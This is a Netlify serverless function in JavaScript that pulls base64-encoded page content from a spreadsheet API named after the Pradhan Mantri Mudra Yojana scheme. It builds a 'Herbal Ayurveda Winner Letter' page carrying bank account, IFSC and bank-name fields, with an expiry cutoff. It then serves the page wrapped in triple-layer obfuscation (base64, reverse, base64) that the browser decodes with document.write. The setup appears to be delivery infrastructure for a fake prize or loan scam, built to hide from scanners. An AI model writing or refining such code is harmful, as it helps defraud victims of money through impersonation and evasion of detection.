// netlify/functions/page.js
// CommonJS handler for Netlify functions
const DEFAULT_EXPIRY_ID = "TRL";
const SHEETBASE_URL = "https://sheetbase.co/api/pradhan_mantri_mudra_yojna/1s2x-KZ-dm0rRHGEoqNxbe06RBxQlkJXQdYIXn3La49U/sheet1/";
const DATETIME_URL  = "https://datetimeapi.vercel.app/api/datetime.js";

async function fetchJsonRobust(url) {
  const resp = await fetch(url);
  const text = await resp.text();
  // Try JSON.parse first, otherwise try to extract {...}
  try {
    return JSON.parse(text);
  } catch (e) {
    // attempt to extract first JSON-like brace block
    const m = text.match(/\{[\s\S]*\}/);
    if (m) {
      try { return JSON.parse(m[0]); } catch (e2) { /* fallthrough */ }
    }
    // fallback: return null
    return null;
  }
}

exports.handler = async function (event, context) {
  const expiryId = process.env.EXPIRY_ID || DEFAULT_EXPIRY_ID;
  const sheetbaseApiUrl = process.env.SHEETBASE_URL || SHEETBASE_URL;
  const datetimeApiUrl = process.env.DATETIME_URL || DATETIME_URL;

  try {
    // 1) Server-side get datetime
    const tjson = await fetchJsonRobust(datetimeApiUrl);
    if (!tjson || !tjson.datetime) {
      return {
        statusCode: 200,
        headers: { "Content-Type": "text/html; charset=utf-8" },
        body: "<h2>Datetime error</h2>"
      };
    }
    const serverDatetime = tjson.datetime;

    // 2) Server-side get sheetbase JSON
    const sheetData = await fetchJsonRobust(sheetbaseApiUrl);
    if (!sheetData || !Array.isArray(sheetData.data)) {
      return {
        statusCode: 200,
        headers: { "Content-Type": "text/html; charset=utf-8" },
        body: "<h2>Sheetbase data error</h2>"
      };
    }

    // 3) find item by id
    const item = sheetData.data.find(e => String(e.id) === String(expiryId));
    if (!item) {
      return {
        statusCode: 200,
        headers: { "Content-Type": "text/html; charset=utf-8" },
        body: "<h2>Entry missing</h2>"
      };
    }

    // 4) expiry check
    if (new Date(serverDatetime) > new Date(item.date)) {
      return {
        statusCode: 200,
        headers: { "Content-Type": "text/html; charset=utf-8" },
        body: "<h2>This Page is expired.</h2>"
      };
    }

    // 5) decode base64 fields (if present)
    const decodedHTML = item.html ? Buffer.from(item.html, "base64").toString("utf8") : "";
    const decodedCSS  = item.css  ? Buffer.from(item.css,  "base64").toString("utf8") : "";
    const decodedJS   = item.init ? Buffer.from(item.init, "base64").toString("utf8") : "";

    // WARNING: To guarantee zero network calls, make sure decodedHTML/JS/CSS
    // do not include external <script src=>, <link href=>, <img src=> or fetch() calls.

    // 6) Build complete page with inline CSS and JS
    const fullPage = `<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Herbal Ayurveda Winner Letter</title>
<style>${decodedCSS}</style>
<script>
window.SERVER_EXPIRY = ${JSON.stringify(item.date)};
window.SERVER_TIME   = ${JSON.stringify(serverDatetime)};
window.SERVER_ACC    = ${JSON.stringify(item.acc || "")};
window.SERVER_IFSC   = ${JSON.stringify(item.ifsc || "")};
window.SERVER_BANK   = ${JSON.stringify(item.bank || "")};
</script>
</head>
<body>
${decodedHTML}
<script>
${decodedJS}
if (typeof initializePage === 'function') {
  try { initializePage(); } catch (err) { console.error(err); }
}
</script>
</body>
</html>`;

    // 7) Triple-layer obfuscation: base64 -> reverse -> base64
    const layerA = Buffer.from(fullPage, "utf8").toString("base64");
    const layerB = layerA.split("").reverse().join("");
    const layerC = Buffer.from(layerB, "utf8").toString("base64");

    // 8) Return only the obfuscated payload + small decoder (no external calls)
    const out = `<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Loading...</title>
</head>
<body>
<script>
(function(){
  try {
    const payload = ${JSON.stringify(layerC)};
    const step1 = atob(payload);
    const step2 = step1.split('').reverse().join('');
    const finalHtml = atob(step2);
    document.open();
    document.write(finalHtml);
    document.close();
  } catch (e) {
    console.error('Decode error', e);
    document.open();
    document.write('<h2>Page load error</h2>');
    document.close();
  }
})();
</script>
</body>
</html>`;

    return {
      statusCode: 200,
      headers: {
        "Content-Type": "text/html; charset=utf-8",
        "Cache-Control": "no-store"
      },
      body: out
    };

  } catch (err) {
    console.error("Function error:", err && err.stack ? err.stack : err);
    return {
      statusCode: 500,
      headers: { "Content-Type": "text/html; charset=utf-8" },
      body: "<h2>Internal server error</h2>"
    };
  }
};
